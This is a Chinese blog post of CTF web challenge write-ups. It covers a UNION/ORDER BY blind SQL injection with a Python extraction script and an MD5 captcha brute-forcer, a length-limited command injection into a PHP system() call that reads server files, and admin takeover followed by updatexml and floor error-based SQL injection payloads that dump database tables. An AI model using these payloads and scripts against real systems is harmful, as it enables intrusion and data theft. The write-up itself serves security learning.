---
title: AH-Web-Write-Up
date: 2018-06-12 16:34:37
categories: Write Up
tags:
description:
---

记录一下一些题目
<!-- more -->
# Injection
很有意思的一道题目，也看了别人wp，懂得了很多，写一下自己的理解

<br>
## 题目分析
提示给的是 注入！注入！注入！
访问靶机，出现一张简单的登录页面

![injection1](injection1.png)


随便尝试一些弱口令和万能密码，没什么结果，右键源代码，发现提示信息

![injection2](injection2.png)

进入是一张注册界面，简单的注册个账户，先尝试登录，发现登录成功，发现很明显的id参数，所以直接开始尝试一下其他id的值(1,2,3,4)

![injection3](injection3.png)


发现`id=1`是admin的账户并且给出了提示


![injection4](injection4.png)

访问后发现是站点源码，只有5张页面

![injection5](injection5.png)

先看`profile.php`，由于代码量，所以只给出关键代码

页面开头给出了表结构，但是第四列是一个变量，也就是我们无法得到第四列名的信息
```
/*
CREATE TABLE `users` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `user` varchar(20) DEFAULT NULL,
  `pass` varchar(32) DEFAULT NULL,
  `$secret` varchar(36) DEFAULT NULL,
  `count` int(3) DEFAULT NULL,
  PRIMARY KEY (`id`)
)
*/
```

剩下代码业务逻辑大致是 访问页面后会判断用户信息，记录访问次数，如果访问次数超过140次，那么兑换码就会被重置($secret字段就是存兑换码的字段)
而兑换码是根据`1234567890abcdefghijklmnopqrstuvwxyz`乱序去生成的
关键代码如下
```
// 兑换码生成与验证
function duihuanma_product()
{
    $string = "1234567890abcdefghijklmnopqrstuvwxyz";
    return str_shuffle($string);
}

function change($secret)
{
    global $username,$row;
    $duihuanma = duihuanma_product();
    $row = mysql_fetch_array(mysql_query("select * from users where user='$username'"));
    $count = $row['count'];
    if (!$row[$secret]){
        mysql_query("update users set $secret='{$duihuanma}' where user='$username'");
    }
    if($row['count'] == 140)
    {

        if(mysql_query("update users set $secret='{$duihuanma}' where user='$username';"))
        {
            mysql_query("update users set count=0 where user='$username';");
            die("<center><br><h3>尝试次数过多，兑换码已经重置</h3></center>");
        }
        return $duihuanma;
    }
    else
    {
    mysql_query("update users set count=({$row['count']} + 1) where user='$username';");
    }
    return $row[$secret];
}

// id值的业务代码
$id=$_GET['id']?$_GET['id']:0;
if(preg_match("#\.#",$id) or preg_match("#_#",$id) or preg_match("#\(#",$id) or preg_match("#\)#",$id))
    die('<h3>danger character dectected</h3>');
$sql = "select * from users where id=$id";
$result = mysql_query($sql);
$rownew = @mysql_fetch_array($result);
$rownew['user']=$rownew['user']?$rownew['user']:"noman";
?>
<h3>This is <?php echo $rownew['user'];?> page,您已经访问<?php echo $row['count']+1;?>次</h3><br>
<?php
if ($rownew['user']==='admin'){
    echo "<br><h3>good job,hint: thisissourcecode.zip</h3>";
}
```

在看`flag.php`页面，界面效果如下

![injection6](injection6.png)

看页面也知道需要兑换码和md5验证才能获得flag，关键代码如下
```
// 验证码生成
$captcha= getCaptcha(4);
$_SESSION['captcha'] = $captcha;
function getCaptcha($length){
	$str = null;
	$strPol = "0123456789abcdef";
	$max = strlen($strPol)-1;

	for($i=0;$i<$length;$i++){
		$str.=$strPol[rand(0,$max)];
	}
	return $str;
}

// 对比验证码
if (isset($_POST['captcha']) && isset($_POST['duihuanma'])) {
	if(!(substr(md5($_POST['captcha']), 0, 4)===$_SESSION['captcha']))
		die('<center><p>captcha not right</p></center>');
    $sql = "select $secret from users where user='${_SESSION['username']}'";
    #echo $sql;
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);

}

// 对比兑换码
if (isset($_POST['duihuanma'])){
  if ($row[$secret]===$_POST['duihuanma']){
      echo "<br><center>".$flag."</center>";
  }else{
      echo "<center>flag兑换码不正确</center>";
  }
}
```
<br>
## Order by 盲注获得兑换码
代码审计下来得到了大致的思路，需要先注入得到兑换码，然后在爆破MD5验证码后，提交即可

但是注入过滤了`. _ ( )` ，所以我们无法使用函数
同时我们也不知道兑换码字段名称，那么常规的方法无从下手
查阅资料得到，可以通过order by的一种注入手段来得到数据内容，具体原理可以看以下两篇文章，总结的很好
[利用order by 进行盲注](http://p0sec.net/index.php/archives/106/)
[基于union查询的盲注(感谢pcat牛不吝赐教)](http://wonderkun.cc/index.html/?p=547)

我们可以利用**UNION与ORDER BY 在不需要知道列名的情况下盲注得到真实数据**

假设兑换码第一个字符是`5`，当我们执行如图的语句之后，由于`6`的ASCII码比`5`大，所以还是显示原来的数据内容

![injection7](injection7.png)
![injection8](injection8.png)
![injection9](injection9.png)

观察上面的图片，就能发现
 - 传入值大于兑换码值，会显示原来的数据
 - 传入值小于或等于兑换码，会显示`union`的数据

但是题目要求我们在140内需要得到答案，如果使用了二分法也无法达到140内(测试下来一个数大概需要5-6次便可以确定，36个数便远远超过预设值)

但是兑换码生成的算法是**乱序**，也就是说每一个字符必定只出现一次(在想的时候[gokoucat大佬](http://gokoucat.cn/)看一眼就找到了关键点，膜拜)

那么便有可能达到140内，并且最后一次也无需去发送请求(同时膜拜[phorse师傅如何更高效的盲注爆取数据-二分法](https://xz.aliyun.com/t/1520/?utm_source=tuicool&utm_medium=referral))
那么我们便可以写出python脚本
```python
# coding=utf-8
import requests
import math

ALL = "0123456789abcdefghijklmnopqrstuvwxyz"
flag = ""
cookies = {"PHPSESSID": "7v527f98146aite4mobo4n0b13"}
count = 0
for i in range(35):
    left = 0
    right = len(ALL) - 1
    mid = int(math.ceil((left + right) / 2.0))
    while left < right:
        count += 1
        url = "http://10.10.118.51/profile.php?id=5 union select 1,2,3,'"+ flag + str(ALL[mid]) + "',5 order by 4"
        res = requests.get(url, cookies=cookies).text
        if "This is 2 page" in res:
            left = mid
        else:
            right = mid - 1
        mid = int(math.ceil((left + right) / 2.0))
        print(left, mid, right)
    flag += ALL[mid]
    # 去除已经出现的字符
    ALL = ALL.replace(ALL[mid], '')

print("-" * 100)
print(flag+ALL)
print(count)
print("-" * 100)
```
这边需要注意的是，由于`x<mid or x = mid`的回显情况相同都是`This is 2 page`，而`x>mid`的回显情况是`id=5的用户名` (x为兑换码)
所以计算`mid`需要向上取整

结果如下
![injection10](injection10.png)

<br>
## 爆破MD5验证码
我们已经获得了兑换码，那么还需要利用简单的python脚本爆破MD5验证码
```
import hashlib

result = 1
while True:
    m = hashlib.md5(str(result))
    m = m.hexdigest()
    if m[0:4] == "ee6a":
        print(m)
        print(result)
        break
    result += 1
```
结果如下

![injection11](injection11.png)

提交后可以成功获取flag值

![injection12](injection12.png)


后来在google中也找到了原题的wp，非常详细的解答
[【原创】Pwnhub会员日一题引发的思考](https://xz.aliyun.com/t/1520/?utm_source=tuicool&utm_medium=referral#toc-2)


<br>
# 刀塔
无论你喜欢打Dota还是LOL，都进网站里学习一下吧！

题目有两种解法，扫目录的时候发现`www.zip`文件，直接能拿源码
另一种是预期解，后来从源码分析中也得知到了

进入页面没有什么特别的信息
![daota1](2018-06-26-16-56-03.png)

有`flag.php`文件，点击进入也没有什么信息
![daota2](2018-06-26-17-05-09.png)

接下来思路也比较明确，利用某些漏洞信息去读取`flag.php`文件内容，一般只有命令执行或者任意文件读取这样的漏洞
但是页面只给了两个几个参数点，大概试了下SQL注入，发现无效，所以猜测他显示文章的业务逻辑是如何的

猜测是否是伪静态页面或者参数信息为文件路径，简单测试果然出现了信息，那么说明思路没错，`pid`测试下来应该是被强转为数字类型了
![daota3](2018-06-26-19-53-55.png)

`nid`中发现出现了`lllegal operation!`的过滤信息

![daota4](2018-06-26-20-08-35.png)

各种尝试下，发现长度只有5，并且不能出现英文，可以出现标点符号和数字
建立在这种前提下，基本就能确定，是用linux命令去读取文件，例如`cat`，那么我们可以构建读取上层目录所有文件
![daota5](2018-06-26-20-14-59.png)
发现还会带有文件名，然后一堆乱码，开始还以为内容无法读取，然后linux系统里面试了下，右键源代码，发现了文件内容

![daota6](2018-06-26-20-16-16.png)

在最开始我是用御剑就扫到源码，后来发现过滤规则也的确如此
```
if(isset($_GET['nid'])){

    if(preg_match("/[a-zA-Z]/",$_GET['nid'])){
        exit("Illegal operation!");
    }elseif(strlen($_GET[nid])>5){
        exit("Illegal operation!");
    }else{
        echo "<p class=lead>";
        system("head ./news/" . $_GET['nid']);
        echo "</p>";
    }

}else{
    echo "<h3><a href=index.php?act=news&nid=1>鱼人守卫</a></h3>";
    echo "<h3><a href=index.php?act=news&nid=2>黑暗游侠</a></h3>";
    echo "<h3><a href=index.php?act=news&nid=3>血魔</a></h3>";

}
```

<br>
# 未上线的聊天室

进入题目就是一个简单的聊天室，但是需要注册登录才能留言，所以先注册一波

![liaotianshi1](2018-07-03-09-52-53.png)

整个站点的功能并不多，所以从留言功能上来看

每次注册成功后，留言上面会显示注册的用户名，但是只显示6位，并且后3位用*号来代替了
对于XSS也有做转义

![liaotianshi2](2018-07-03-11-03-54.png)

在尝试留言的时候，发现发送过快会有报错信息

![liaotianshi3](2018-07-03-11-05-18.png)

发现里面有自己账户的信息`isadmin=0`，还有一些关于代码的报错信息

----------------------------

然后就在想，既然能利用报错回显自己的信息，那能否利用报错报出其他有用的信息，于是在各个点，各种尝试无果，思路就停止在这

后来在网上看见WriteUp，是通过注册相同用户名，导致username主键相同产生报错(想不懂...)

![liaotianshi4](2018-07-04-10-38-41.png)

可以看见插入的语句，往下翻能看见所有账户数据

![liaotianshi5](2018-07-04-10-40-10.png)

发现了管理员的账户和MD5加密后的密码，直接用[SOMD5](https://somd5.com/)得到密码，直接管理员登录

管理员登录之后，发现管理员多出了一个删除功能

![liaotianshi6](2018-07-04-11-06-35.png)


抓了删除功能的请求包，发现是在后端做删除确认，利用`id=24-1`发现是数字型注入

由于是delete注入类型，直接尝试报错注入`id=24||%20updatexml(1,concat(1,database(),0x7e),1)`，发现可行

![liaotianshi7](2018-07-04-11-18-32.png)

但是利用`Xpath`报错如果带上`select`会出现问题
`id=24||%20updatexml(1,concat(1,(select%20database()),0x7e),1)`

![liaotianshi8](2018-07-04-11-21-23.png)

所有换一种报错姿势
```
// 表名 z_flag_986746633
id=24||(select%201%20from%20(select%20count(*),concat((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
// 列名 id,flag
id=24||(select%201%20from%20(select%20count(*),concat((select%20column_name%20from%20information_schema.columns%20where%20table_name='z_flag_986746633'%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
// 数据
id=24||(select%201%20from%20(select%20count(*),concat((select%20mid(flag,1,100)%20from%20z_flag_986746633%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
```


<br>
## 问题

### 报错信息
 - 这是什么报错信息
 - 为什么会显示的那么完整
 - 为什么需要达到主键长度才能导致报错

### 利用Xpath报错注入问题
利用`Xpath`报错如果带上`select`会出现问题
`id=24||%20updatexml(1,concat(1,(select%20database()),0x7e),1)`
![liaotianshi8](2018-07-04-11-21-23.png)

### floor报错注入问题

#### 问题1
```
// 使用group_concat()获取所有的数据内容，在该环境下，会直接报错
// 直接在MYSQL中运行程序会直接执行，不会出现任何报错信息
id=24||(select%201%20from%20(select%20count(*),concat((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='z_flag_986746633'%20),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
```
![liaotianshi9](2018-07-04-14-54-32.png)

#### 问题2
```
// 如果列名不用mid等函数去包裹，同样会报错
id=24||(select%201%20from%20(select%20count(*),concat((select%20flag%20from%20z_flag_986746633%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
```
![liaotianshi9](2018-07-04-14-54-32.png)



以上两个问题报错的信息是一致的，但是又和现象不符合














